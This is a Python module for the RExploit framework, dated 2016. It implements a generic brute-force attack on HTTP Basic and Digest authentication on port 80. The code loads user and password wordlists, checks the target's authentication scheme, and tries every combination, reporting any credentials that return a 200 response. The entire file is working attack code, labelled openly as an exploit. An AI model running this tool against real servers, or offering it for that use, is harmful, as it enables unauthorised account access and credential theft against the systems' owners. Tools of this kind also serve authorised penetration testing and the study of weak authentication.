from lib.interfaces.iexploit import IExploit
from modules.auxiliary.io import getContentFromFile
import requests
from requests.auth import HTTPBasicAuth, HTTPDigestAuth


class Exploit(IExploit):
    def __init__(self):
        super(Exploit, self).__init__(
            name="Bruteforce attack authentication web",
            category="bf",
            authors={
                "Daniel Diez": "RExploit module"
            },
            targets=[
                "All"
            ],
            date="11/04/2016",
            cwe="255",
            description="This a generic exploit for attack authentication web (port 80). It's work for basic and digest. Test with credentials by default.",
        )

    def default(self):
        data = {"port": "80",
                "users": "users.txt",
                "passwords": "passwords.txt"}

        return data

    def run(self, data):
        port = data["port"]
        users = getContentFromFile(data["users"])
        passwords = getContentFromFile(data["passwords"])
        url = "http://{0}:{1}".format(self.getIP(), port)
        response = requests.get(url)
        message = ""

        if response is not None:
            if response.status_code != 401:
                message = "{} is not protected by authentication system".format(self.getIP())
                return message
            else:
                if 'Basic' in response.headers['WWW-Authenticate']:
                    auth = "basic"
                elif 'Digest' in response.headers['WWW-Authenticate']:
                    auth = "digest"
                else:
                    auth = None

        for user in users:
            for password in passwords:
                try:
                    if auth == "basic":
                        response = requests.get(url, auth=HTTPBasicAuth(user, password.strip()))
                    elif auth == "digest":
                        response = requests.get(url, auth=HTTPDigestAuth(user, password.strip()))
                    else:
                        return None

                    if response.status_code == 200:
                        message += "Credentials found\nUsername: {0} Password: {1}\n".format(user, password)
                except requests.ConnectionError:
                    return None

        if message == "":
            message = "Sorry. Credentials not found"

        return message
